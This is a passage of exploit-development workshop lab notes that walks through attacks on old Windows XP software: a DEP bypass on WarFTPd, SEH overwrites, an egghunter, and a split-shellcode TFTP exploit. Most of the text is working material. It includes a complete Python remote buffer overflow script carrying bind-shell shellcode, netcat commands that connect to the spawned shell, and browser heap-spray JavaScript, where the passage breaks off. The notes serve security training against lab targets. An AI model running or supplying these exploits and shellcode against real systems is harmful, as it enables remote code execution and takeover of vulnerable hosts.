+ 
+python warftpd4.py | nc XPSP3-ED-Target-IP 21
+ 
+nc XPSP3-ED-Target-IP 4444
+   -----------------------------------------------------------------------
+
+ 
+strategicsec....exploit no workie!!!!
+ 
+ 
+Why????????? DEP!!!!!!!!!!!!!
+ 
+ 
+ 
+ 
+Let's look through ole32.dll for the following instructions:
+ 
+mov al,0x1
+ret 0x4
+ 
+We need to set al to 0x1 for the LdrpCheckNXCompatibility routine.
+ 
+ 
+   ---------------------------Type This-----------------------------------
+ 
+./msfpescan -D -r "\xB0\x01\xC2\x04" DLLs/xpsp3/ole32.dll
+  -----------------------------------------------------------------------
+
+[DLLs/xpsp3/ole32.dll]
+0x775ee00e b001c204
+0x775ee00e      mov al, 1
+0x775ee010      ret 4
+ 
+ 
+Then we need to jump to the LdrpCheckNXCompatibility routine in
+ntdll.dll that disables DEP.
+ 
+ 
+ 
+Inside of ntdll.dll we need to find the following instructions:
+ 
+CMP AL,1
+PUSH 2
+POP ESI
+JE ntdll.7
+ 
+    ---------------------------Type This-----------------------------------
+
+ 
+./msfpescan -D -r "\x3C\x01\x6A\x02\x5E\x0F\x84" DLLs/xpsp3/ntdll.dll
+   -----------------------------------------------------------------------
+
+[DLLs/xpsp3/ntdll.dll]
+0x7c91cd24 3c016a025e0f84
+0x7c91cd24      cmp al, 1
+0x7c91cd26      push 2
+0x7c91cd28      pop esi
+0x7c91cd29      jz 7
+ 
+ 
+This set of instructions makes sure that AL is set to 1, 2 is pushed
+on the stack then popped into ESI.
+ 
+ 
+ 
+    ---------------------------Type This-----------------------------------
+ 
+ 
+dep = "\x0e\xe0\x5e\x77"+\
+"\xff\xff\xff\xff"+\
+"\x24\xcd\x91\x7c"+\
+"\xff\xff\xff\xff"+\
+"A"*0x54
+ 
+   -----------------------------------------------------------------------
+
+ 
+    #############################
+    # Start WarFTPd             #
+    # Start WinDBG              #
+    # Press F6                  #
+    # Attach to war-ftpd.exe    #
+    # bp 0x775ee00e             #
+    # g                         #
+    #############################
+ 
+ 
+---------------------------Type This-----------------------------------
+
+ 
+python warftpd5.py | nc XPSP3-ED-Target-IP 21
+ 
+-----------------------------------------------------------------------
+We need to set al to 0x1 for the LdrpCheckNXCompatibility routine.
+ 
+    mov al,0x1
+    ret 0x4
+ 
+ 
+ 
+ 
+0:005> g
+Breakpoint 0 hit
+eax=00000001 ebx=00000000 ecx=00000001 edx=00000000 esi=7c80932e edi=00affe58
+eip=775ee00e esp=00affd58 ebp=00affdb0 iopl=0         nv up ei pl nz ac pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
+ole32!CSSMappedStream::IsWriteable:
+775ee00e b001            mov     al,1
+ 
+ 
+0:001> t
+eax=00000001 ebx=00000000 ecx=00000001 edx=00000000 esi=7c80932e edi=00affe58
+eip=775ee010 esp=00affd58 ebp=00affdb0 iopl=0         nv up ei pl nz ac pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
+ole32!CSSMappedStream::IsWriteable+0x2:
+775ee010 c20400          ret     4
+ 
+ 
+ 
+ 
+ 
+---------------------------------------------------------------------------
+Ok, so inside of ntdll.dll we need to find the following instructions:
+ 
+    CMP AL,1
+    PUSH 2
+    POP ESI
+    JE ntdll.7
+ 
+0:001> t
+eax=00000001 ebx=00000000 ecx=00000001 edx=00000000 esi=7c80932e edi=00affe58
+eip=7c91cd24 esp=00affd60 ebp=00affdb0 iopl=0         nv up ei pl nz ac pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
+ntdll!LdrpCheckNXCompatibility+0x13:
+7c91cd24 3c01            cmp     al,1
+ 
+ 
+0:001> t
+eax=00000001 ebx=00000000 ecx=00000001 edx=00000000 esi=7c80932e edi=00affe58
+eip=7c91cd26 esp=00affd60 ebp=00affdb0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+ntdll!LdrpCheckNXCompatibility+0x15:
+7c91cd26 6a02            push    2
+ 
+ 
+0:001> t
+eax=00000001 ebx=00000000 ecx=00000001 edx=00000000 esi=7c80932e edi=00affe58
+eip=7c91cd28 esp=00affd5c ebp=00affdb0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+ntdll!LdrpCheckNXCompatibility+0x17:
+7c91cd28 5e              pop     esi
+ 
+ 
+0:001> t
+eax=00000001 ebx=00000000 ecx=00000001 edx=00000000 esi=00000002 edi=00affe58
+eip=7c91cd29 esp=00affd60 ebp=00affdb0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+ntdll!LdrpCheckNXCompatibility+0x18:
+7c91cd29 0f84df290200    je      ntdll!LdrpCheckNXCompatibility+0x1a (7c93f70e) [br=1]
+ 
+ 
+---------------------------------------------------------------------------
+ 
+ 
+ ---------------------------Type This-----------------------------------
+ 
+python warftpd5.py | nc XPSP3-ED-Target-IP 21
+ 
+nc XPSP3-ED-Target-IP 4444
+ 
+ -----------------------------------------------------------------------
+
+##########################
+# Lab 1c: SEH Overwrites #
+##########################
+ 
+    #################################################
+    # On our VictimXP Host (XPSP3-ED-Target-IP)     #
+    # Start sipXexPhone if it isn’t already running #
+    # Start WinDBG                                  #
+    # Press “F6” and Attach to sipXexPhone.exe      #
+    # Press “F5” to start the debugger              #
+    #################################################
+ 
+ ---------------------------Type This-----------------------------------
+ 
+cd C:\Documents and Settings\strategic security\Desktop\ED-Workshop-Files\Lab1c\sipx_complete
+ 
+ 
+ 
+python sipex0.py XPSP3-ED-Target-IP
+ 
+    0:003> !exchain
+    0:003> dds esp
+    0:003> dds
+ 
+python sipex1.py XPSP3-ED-Target-IP
+ 
+    0:003> !exchain
+    0:003> g
+ 
+    When looking at !exchain you should see that EIP is 41414141, so let’s add more characters.
+ 
+ 
+python sipex2.py XPSP3-ED-Target-IP
+ 
+    0:003> !exchain
+    0:003> g
+ 
+ 
+    ***ssh into instructor Ubuntu host***
+    cd /home/strategicsec/toolz/metasploit/tools/exploit
+    ruby pattern_offset.rb 41346941             We should see that SEH is at 252
+ 
+ 
+ 
+    !load narly
+    !nmod
+ 
+    ***ssh into the Ubuntu host***
+    ls /home/strategicsec/toolz/metasploit/DLLs/xpsp3/sipXDLLs/
+    cd /home/strategicsec/toolz/metasploit/
+    ./msfpescan -p DLLs/xpsp3/sipXDLLs/sipxtapi.dll
+ 
+  -----------------------------------------------------------------------
+
+    #####################################
+    # sipex3.py in Notepad++.           #
+    # Set cseq = 252                    #
+    # Set seh2 address to: 0x10015977   #
+    #####################################
+ 
+ ---------------------------Type This-----------------------------------
+ 
+python sipex3.py XPSP3-ED-Target-IP
+    0:003> !exchain
+ 
+python sipex4.py XPSP3-ED-Target-IP
+ 
+ 
+ 
+nc XPSP3-ED-Target-IP 4444
+ 
+  -----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+Brush up on the basics of Structured Exception Handlers:
+http://www.securitytube.net/video/1406
+http://www.securitytube.net/video/1407
+http://www.securitytube.net/video/1408
+ 
+ 
+
+
+ 
+ 
+########################################
+# Lab 2a: Not Enough Space (Egghunter) #
+########################################
+ 
+cd C:\Documents and Settings\strategic security\Desktop\ED-Workshop-Files\Lab2a\sws_skeleton
+ 
+SWS - SIMPLE WEB SERVER
+-----------------------
+ 
+Running SWS on Strategicsec-XP-ED-Target-VM
+Start > Programs > Simple Web Server (it's in the middle somewhere)
+Red icon in system tray
+Double click it
+- it will pop up a menu
+- select "start"
+- dialog box shows starting params - port 82
+ 
+WinDBG
+- attach to "server.exe"
+ 
+  ---------------------------Type This-----------------------------------
+
+python sws1.py | nc XPSP3-ED-Target-IP 82
+ 
+ 
+ 
+python sws2.py | nc XPSP3-ED-Target-IP 82
+ 
+ 
+SSH into the Ubuntu host (user: strategicsec/pass: strategicsec)
+cd /home/strategicsec/toolz/metasploit/tools/exploit
+ruby pattern_offset.rb 41356841             <------- You should see that EIP is at 225
+ruby pattern_offset.rb 68413668             <------- You should see that ESP is at 229
+ 
+ 
+   -----------------------------------------------------------------------
+
+ 
+ 
+ 
+ 
+ 
+EGGHUNTER:
+----------
+ 
+"\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74"
+"\xEF\xB8\x41\x42\x42\x41\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
+          ^^^^^^^^^^^^^^^^
+               ABBA
+                                         JMP ESP
+                                        /
+                                       /
+GET /AAAAAAAAAAA...225...AAAAAAAAAA[ EIP ]$egghunter HTTP/1.0
+User-Agent: ABBAABBA LARGE SHELLCODE (Alpha2 encoded)
+ 
+ 
+ 
+ 
+-----sws3.py-----
+#!/usr/bin/python2
+ 
+import os # for output setting
+import sys
+import struct # for pack function
+ 
+# turn off output buffer and set binary mode
+sys.stdout = os.fdopen(sys.stdout.fileno(), 'wb', 0)
+ 
+ 
+pad = "A" * 225        # distance to EIP
+eip = 0x7e429353       # replace EIP to point to "jmp esp" from user32.dll
+ 
+egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74"
+egghunter += "\xEF\xB8\x41\x42\x42\x41\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
+ 
+shellcode = "\xCC" * 700
+ 
+buf = "GET /"
+buf += pad + struct.pack('<I', eip) + egghunter
+buf += " HTTP/1.0\r\n"
+buf += "User-Agent: ABBAABBA"
+buf += shellcode
+buf += " HTTP/1.0\r\n"
+ 
+sys.stdout.write(buf)
+-----
+
+
+
+############################################
+# Lab 2b: Not Enough Space (Negative Jump) #
+############################################
+   ---------------------------Type This-----------------------------------
+
+cd C:\Documents and Settings\strategic security\Desktop\ED-Workshop-Files\Lab2a\modjk_skeleton
+   -----------------------------------------------------------------------
+
+ 
+[pad = distance_to_seh - len(shellcode) ] [ shellcode] [jmp4 = "\x90\x90\xEB\x04"] [eip (pop pop ret)] [jmp_min = "\xE9\x98\xEF\xFF\xFF"]
+ 
+                                                                        ^
+1 ----------------------1 overflow the buffer---------------------------|
+                                                                       
+                                                                        ^                            ^
+                                                                        |
+                                                                        2 ----jump over seh record---|
+ 
+                                                                                                     ^                          ^      
+                                                                                                     |
+                                                                                                     3--POP 2 words off stack---|
+ 
+                                                                                                                                        ^                                      
+4 -----negative jump into NOPs - then into shellcode -----------------------------------------------------------------------------------|
+ 
+ 
+#########################################
+# Lab 2c: Not Enough Space (Trampoline) #
+#########################################
+ 
+cd C:\Documents and Settings\strategic security\Desktop\ED-Workshop-Files\Lab2c\tftpd_skeleton
+On the Strategicsec-XP-ED-Target-VM VM
+ 
+- open a command prompt
+- c:\software\tftpd32
+- run tftpd32.exe
+- UDP port 69
+(socket code is already in the scripts)
+ 
+ 
+ 
+ 
+On your attack host please install:
+ 
+ 
+  NASM - Netwide Assembler
+ 
+ 
+ 
+ 
+ 
+-----------------------------------------------------------------------------------------------------------------
+ 
+ 
+We want to generate the shellcode (BIND SHELL on Port 4444)
+- No restricted characters
+- Encoder: NONE
+ 
+Create a Python file called dumpshellcode.py
+ 
+---
+#!/usr/bin/python2
+ 
+import os
+import sys
+import struct
+ 
+ 
+# win32_bind -  EXITFUNC=seh LPORT=4444 Size=317 Encoder=None http://metasploit.com
+shellcode = "\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45"
+shellcode += "\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49"
+shellcode += "\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d"
+shellcode += "\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66"
+shellcode += "\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61"
+shellcode += "\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40"
+shellcode += "\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32"
+shellcode += "\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6"
+shellcode += "\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09"
+shellcode += "\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0"
+shellcode += "\x66\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff"
+shellcode += "\xd6\x6a\x10\x51\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53"
+shellcode += "\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff"
+shellcode += "\xd0\x93\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64"
+shellcode += "\x66\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89"
+shellcode += "\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38\xab"
+shellcode += "\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57\x52\x51"
+shellcode += "\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53"
+shellcode += "\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83\xc4\x64\xff\xd6"
+shellcode += "\x52\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6\xff\xd0"
+ 
+sys.stdout.write(shellcode)
+---
+ 
+   ---------------------------Type This-----------------------------------
+
+ 
+python dumpshell.py > bindshell.bin
+ 
+copy bindshellcode.bin into the "c:\Program Files\nasm" directory
+   -----------------------------------------------------------------------
+ 
+ 
+ 
+Here we saved the raw shellcode generated by metasploit into a file called bindshell.bin
+317 bindshell.bin
+   ---------------------------Type This-----------------------------------
+ 
+C:\Program Files\nasm>ndisasm -b 32 bindshell.bin
+   -----------------------------------------------------------------------
+
+00000000  FC                cld
+00000001  6AEB              push byte -0x15
+00000003  4D                dec ebp
+00000004  E8F9FFFFFF        call dword 0x2
+00000009  60                pushad
+0000000A  8B6C2424          mov ebp,[esp+0x24]
+0000000E  8B453C            mov eax,[ebp+0x3c]
+00000011  8B7C0578          mov edi,[ebp+eax+0x78]
+00000015  01EF              add edi,ebp
+00000017  8B4F18            mov ecx,[edi+0x18]
+0000001A  8B5F20            mov ebx,[edi+0x20]
+0000001D  01EB              add ebx,ebp
+0000001F  49                dec ecx
+00000020  8B348B            mov esi,[ebx+ecx*4]
+00000023  01EE              add esi,ebp
+00000025  31C0              xor eax,eax
+00000027  99                cdq
+00000028  AC                lodsb
+00000029  84C0              test al,al
+0000002B  7407              jz 0x34
+0000002D  C1CA0D            ror edx,0xd
+00000030  01C2              add edx,eax
+00000032  EBF4              jmp short 0x28
+00000034  3B542428          cmp edx,[esp+0x28]
+00000038  75E5              jnz 0x1f
+0000003A  8B5F24            mov ebx,[edi+0x24]
+0000003D  01EB              add ebx,ebp
+0000003F  668B0C4B          mov cx,[ebx+ecx*2]
+00000043  8B5F1C            mov ebx,[edi+0x1c]
+00000046  01EB              add ebx,ebp
+00000048  032C8B            add ebp,[ebx+ecx*4]
+0000004B  896C241C          mov [esp+0x1c],ebp
+0000004F  61                popad
+00000050  C3                ret
+00000051  31DB              xor ebx,ebx
+00000053  648B4330          mov eax,[fs:ebx+0x30]
+00000057  8B400C            mov eax,[eax+0xc]
+0000005A  8B701C            mov esi,[eax+0x1c]
+0000005D  AD                lodsd
+0000005E  8B4008            mov eax,[eax+0x8]
+00000061  5E                pop esi
+00000062  688E4E0EEC        push dword 0xec0e4e8e
+00000067  50                push eax
+00000068  FFD6              call esi
+0000006A  6653              push bx
+0000006C  66683332          push word 0x3233
+00000070  687773325F        push dword 0x5f327377
+00000075  54                push esp
+00000076  FFD0              call eax
+00000078  68CBEDFC3B        push dword 0x3bfcedcb
+0000007D  50                push eax
+0000007E  FFD6              call esi                     PART 1
+00000080  5F                pop edi
+00000081  89E5              mov ebp,esp
+00000083  6681ED0802        sub bp,0x208
+00000088  55                push ebp
+00000089  6A02              push byte +0x2
+0000008B  FFD0              call eax
+0000008D  68D909F5AD        push dword 0xadf509d9
+00000092  57                push edi
+00000093  FFD6              call esi
+00000095  53                push ebx
+00000096  53                push ebx
+--------------------------------------------CUTCUTCUTCUTCUT----8<---8<---8<---
+00000097  53                push ebx
+00000098  53                push ebx
+00000099  53                push ebx
+0000009A  43                inc ebx
+0000009B  53                push ebx
+0000009C  43                inc ebx
+0000009D  53                push ebx                       PART 2
+0000009E  FFD0              call eax
+000000A0  6668115C          push word 0x5c11
+000000A4  6653              push bx
+000000A6  89E1              mov ecx,esp
+000000A8  95                xchg eax,ebp
+000000A9  68A41A70C7        push dword 0xc7701aa4
+000000AE  57                push edi
+000000AF  FFD6              call esi
+000000B1  6A10              push byte +0x10
+000000B3  51                push ecx
+000000B4  55                push ebp
+000000B5  FFD0              call eax
+000000B7  68A4AD2EE9        push dword 0xe92eada4
+000000BC  57                push edi
+000000BD  FFD6              call esi
+000000BF  53                push ebx
+000000C0  55                push ebp
+000000C1  FFD0              call eax
+000000C3  68E5498649        push dword 0x498649e5
+000000C8  57                push edi
+000000C9  FFD6              call esi
+000000CB  50                push eax
+000000CC  54                push esp
+000000CD  54                push esp
+000000CE  55                push ebp
+000000CF  FFD0              call eax
+000000D1  93                xchg eax,ebx
+000000D2  68E779C679        push dword 0x79c679e7
+000000D7  57                push edi
+000000D8  FFD6              call esi
+000000DA  55                push ebp
+000000DB  FFD0              call eax
+000000DD  666A64            push word 0x64
+000000E0  6668636D          push word 0x6d63
+000000E4  89E5              mov ebp,esp
+000000E6  6A50              push byte +0x50
+000000E8  59                pop ecx
+000000E9  29CC              sub esp,ecx
+000000EB  89E7              mov edi,esp
+000000ED  6A44              push byte +0x44
+000000EF  89E2              mov edx,esp
+000000F1  31C0              xor eax,eax
+000000F3  F3AA              rep stosb
+000000F5  FE422D            inc byte [edx+0x2d]
+000000F8  FE422C            inc byte [edx+0x2c]
+000000FB  93                xchg eax,ebx
+000000FC  8D7A38            lea edi,[edx+0x38]
+000000FF  AB                stosd
+00000100  AB                stosd
+00000101  AB                stosd
+00000102  6872FEB316        push dword 0x16b3fe72
+00000107  FF7544            push dword [ebp+0x44]
+0000010A  FFD6              call esi
+0000010C  5B                pop ebx
+0000010D  57                push edi
+0000010E  52                push edx
+0000010F  51                push ecx
+00000110  51                push ecx
+00000111  51                push ecx
+00000112  6A01              push byte +0x1
+00000114  51                push ecx
+00000115  51                push ecx
+00000116  55                push ebp
+00000117  51                push ecx
+00000118  FFD0              call eax
+0000011A  68ADD905CE        push dword 0xce05d9ad
+0000011F  53                push ebx
+00000120  FFD6              call esi
+00000122  6AFF              push byte -0x1
+00000124  FF37              push dword [edi]
+00000126  FFD0              call eax
+00000128  8B57FC            mov edx,[edi-0x4]
+0000012B  83C464            add esp,byte +0x64
+0000012E  FFD6              call esi
+00000130  52                push edx
+00000131  FFD0              call eax
+00000133  68F08A045F        push dword 0x5f048af0
+00000138  53                push ebx
+00000139  FFD6              call esi
+0000013B  FFD0              call eax
+ 
+ 
+ 
+ 
+part1 = "\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45"
+part1 += "\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49"
+part1 += "\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d"
+part1 += "\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66"
+part1 += "\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61"
+part1 += "\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40"
+part1 += "\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32"
+part1 += "\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6"
+part1 += "\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09"
+part1 += "\xf5\xad\x57\xff\xd6\x53\x53"
+ 
+ 
+part2 = "\x53\x53\x53\x43\x53\x43\x53\xff\xd0"
+part2 += "\x66\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff"
+part2 += "\xd6\x6a\x10\x51\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53"
+part2 += "\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff"
+part2 += "\xd0\x93\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64"
+part2 += "\x66\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89"
+part2 += "\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38\xab"
+part2 += "\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57\x52\x51"
+part2 += "\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53"
+part2 += "\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83\xc4\x64\xff\xd6"
+part2 += "\x52\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6\xff\xd0"
+ 
+ 
+STACK SHIFTER:
+prepend = "\x81\xC4\xFF\xEF\xFF\xFF"  # add esp, -1001h
+prepend += "\x44"                     # inc esp
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+---- final script ----
+ 
+#!/usr/bin/python2
+#TFTP Server remote Buffer Overflow
+ 
+import sys
+import socket
+import struct
+ 
+if len(sys.argv) < 2:
+        sys.stderr.write("Usage: tftpd.py <host>\n")
+        sys.exit(1)
+ 
+target = sys.argv[1]
+port = 69
+ 
+eip = 0x7e429353         # jmp esp in USER32.DLL
+ 
+part1 += "\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45"
+part1 += "\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49"
+part1 += "\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d"
+part1 += "\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66"
+part1 += "\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61"
+part1 += "\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40"
+part1 += "\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32"
+part1 += "\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6"
+part1 += "\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09"
+part1 += "\xf5\xad\x57\xff\xd6\x53\x53"
+ 
+part2 = "\x53\x53\x53\x43\x53\x43\x53\xff\xd0"
+part2 += "\x66\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff"
+part2 += "\xd6\x6a\x10\x51\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53"
+part2 += "\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff"
+part2 += "\xd0\x93\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64"
+part2 += "\x66\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89"
+part2 += "\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38\xab"
+part2 += "\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57\x52\x51"
+part2 += "\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53"
+part2 += "\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83\xc4\x64\xff\xd6"
+part2 += "\x52\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6\xff\xd0"
+ 
+prepend = "\x81\xC4\xFF\xEF\xFF\xFF"                    # add esp, -1001h
+prepend += "\x44"                                       # inc esp
+ 
+buf = "\x00\x01"                                        # receive command
+ 
+buf += "\x90" * (256 - len(part2))                      # NOPs
+buf += part2                                            # shellcode part 2
+buf += struct.pack('<I', eip)                           # EIP (JMP ESP)
+buf += prepend                                          # stack shifter
+buf += part1                                            # shellcode part 1
+buf += "\xE9" + struct.pack('<i', -380)                 # JMP -380
+buf += "\x00"                                           # END
+ 
+# print buf
+ 
+# buf = "\x00\x01"                                      # receive command
+ 
+# buf += "A" * 300 + "\x00"
+ 
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+ 
+try:
+        sock.connect((target, port))
+        sock.sendall(buf)
+except Exception as e:
+        sys.stderr.write("Cannot send to "+str(target)+" : "+str(port)+" : "+str(e)+"!\n")
+finally:
+        sock.close()
+        sys.stderr.write("Sent.\n")
+ 
+ 
+ 
+-----------------------------------------------------------------------------------------------------------------
+ 
+ 
+ 
+ 
+How does all of this actually work
+ 
+ 
+ 
+ 
+Total shellcode length:         315
+       
+                                Part1:  150
+                                Part2:  165
+ 
+ 
+NOPS * (256 - 165)
+ 
+91 NOPS + (165 bytes shellcode p2) + JMP ESP (4 bytes) + Stack Shift (-1000) + (150 bytes shellcode p1) + (neg jmp -380)
+                        |                       |                                       |
+                        256                     260                                     150 (410)               |
+  |<------------------------------------------------------------------------------------------------------------|                                                                                                                                                              
+ Jump to the
+ 30 byte mark
+ 
+ 
+ 
+############################
+# Lab 3: Browsers Exploits #
+############################
+ 
+cd C:\Documents and Settings\strategic security\Desktop\ED-Workshop-Files\Lab3\ffvlc_skeleton
+Quicktime - overflow, if we send a very long rtsp:// URL, Quicktime crashes
+rtsp://AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA......50000
+ 
+<object id=quicktime clsid="999-999999-99-99999">
+  <param name="URL" value="rtsp://AAAAAAAAAAAAAAAAAAAAAAAAA....">
+</object>
+ 
+var buf = "";
+for(i = 0; i < 50000; i++)
+   buf += "A";
+var myobject = document.getElementById("quicktime");
+myobject.url = buf;
+ 
+YOU CAN PRE-LOAD THE PROCESS MEMORY MORE OR LESS IN A WAY YOU LIKE BEFORE TRIGGERING THE EXPLOIT!!!!
+ 
+- Browsers (Flash)
+- PDF
+- MS Office / OOo
+ 
+VLC smb:// exploit
+------------------
+ 
+EXPLOIT VECTOR
+ 
+smb://example.com@0.0.0.0/foo/#{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA}
+ 
+Exploit Scripts
+- ffvlc
+ 
+ON YOUR HOST, RUN THE WEBSERVER ON PORT 8080
+ 
+perl daemon.pl vlc0.html
+ 
+ON YOUR Strategicsec-XP-ED-Target-VM VM, START FIREFOX
+Browse to http://your_host_ip_address:8080/
+ 
+vlc0.html
+---------
+<script>
+   var buf = "";
+   for(i = 0; i < 1250; i++)
+      buf += unescape("%41%41%41%41");
+   var track = "smb://example.com\@0.0.0.0/foo/#{" + buf + "}";
+   document.write("<embed type='application/x-vlc-plugin' target='" + track + "' />");
+</script>
+ 
+vlc1.html
+---------
+<script>
+ 
+   // shellcode created in heap memory
+   var shellcode = unescape("%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc");
+ 
+   // 800K block of NOPS
+   var nop = unescape("%u9090%u09090");   // 4 NOPS
+   while(nop.length < 0xc0000) {
+      nop += nop;
+   }
+ 
+   // spray the heap with NOP+shellcode
+   var memory = new Array();
